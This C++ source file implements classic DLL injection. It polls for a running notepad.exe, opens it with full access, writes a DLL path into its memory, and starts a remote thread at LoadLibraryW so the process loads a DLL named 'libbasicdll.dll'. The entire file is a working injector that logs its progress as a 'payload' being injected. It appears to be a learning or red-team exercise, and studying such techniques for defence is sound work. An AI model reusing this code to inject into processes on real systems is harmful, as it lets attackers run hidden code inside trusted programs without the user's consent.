#include <cstdio>
#include <unistd.h>
#include "../utils.h"

DWORD WaitForNotepad() {
    DWORD dNotepadPid = 0;
    int i = 0;
    while (true) {
        printf("[-] Searching for notepad...\n");
        dNotepadPid = FindFirstNotepad();
        if (!dNotepadPid) {
            printf("[!] No notepad found! Waiting for round %d...\n", i++);
            sleep(5);
        }
        else break;
    }
    return dNotepadPid;
}

int main() {
    DWORD dNotepadPid = 0;
    HANDLE hNotepad = nullptr;
    HMODULE hKernel32 = nullptr;
    PTHREAD_START_ROUTINE lpLoadLibAddr = nullptr;
    LPVOID lpAllocatedMemory = nullptr;
    auto * dRemotePid = (DWORD *) malloc(sizeof(DWORD));
    wchar_t cDllLocation[MAX_PATH] = LR"(C:\Users\Public\dlls\libbasicdll.dll)";
//    if (!(dNotepadPid = FindFirstNotepad())) {
//        printf("[!] No notepad.exe found\n");
//        return EXIT_FAILURE;
//    }
    dNotepadPid = WaitForNotepad();
    printf("[+] Found notepad.exe with PID %lu\n", dNotepadPid);
    if(!(hNotepad = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dNotepadPid))) goto error;
    printf("[+] Opened notepad.exe process\n");
    if (!(hKernel32 = GetModuleHandle(TEXT("Kernel32")))) goto error;
    printf("[+] Found kernel32 handle\n");
    if (!(lpLoadLibAddr = (PTHREAD_START_ROUTINE) GetProcAddress(hKernel32, "LoadLibraryW"))) goto error;
    printf("[+] Found LoadLibraryW address\n");
    if (!(lpAllocatedMemory = VirtualAllocEx(hNotepad, nullptr, sizeof(cDllLocation), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) goto error;
    printf("[+] Allocated %llu bytes in process\n", sizeof(cDllLocation));
    if(!WriteProcessMemory(hNotepad, lpAllocatedMemory, (LPVOID) cDllLocation, sizeof(cDllLocation), nullptr)) goto error;
    printf("[+] Payload injected\n");
    CreateRemoteThread(hNotepad, nullptr, 0, lpLoadLibAddr, lpAllocatedMemory, 0, dRemotePid);
    printf("[+] Remote thread started with PID %lu\n", *dRemotePid);
    CloseHandle(hNotepad);
    return EXIT_SUCCESS;
    // Kill everything
    error:
    if (hNotepad) CloseHandle(hNotepad);
    printError((GetLastError()));
    return EXIT_FAILURE;
}